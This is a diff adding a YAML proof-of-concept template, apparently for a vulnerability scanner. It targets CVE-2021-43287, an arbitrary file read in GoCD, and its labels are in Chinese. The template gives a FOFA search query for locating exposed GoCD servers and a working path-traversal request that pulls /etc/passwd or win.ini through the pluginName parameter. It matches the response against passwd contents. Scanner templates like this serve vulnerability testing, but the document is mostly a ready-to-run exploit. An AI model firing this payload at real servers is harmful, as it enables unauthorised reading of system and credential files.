@@ -1,0 +1,20 @@
+id: poc-yaml-gocd-pluginname-fileread
+info:
+  name: GoCD Business Continuity 任意文件读取漏洞（CVE-2021-43287）
+  severity: high
+  tags:
+  - 文件读取
+  - CVE-2021-43287
+  finger: GoCD
+  fofa: body="data-current-gocd-version"
+variables:
+  r_data_linux: '../../../etc/passwd
+
+    ../../../../windows/win.ini'
+requests:
+- method: GET
+  path: /go/add-on/business-continuity/api/plugin?folderName&pluginName={{.r_data_linux}}
+  expression: "status_code == 200 &&\n(\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
+    \ \"root:.*:0:0:\")\n)\n"
+transport: http
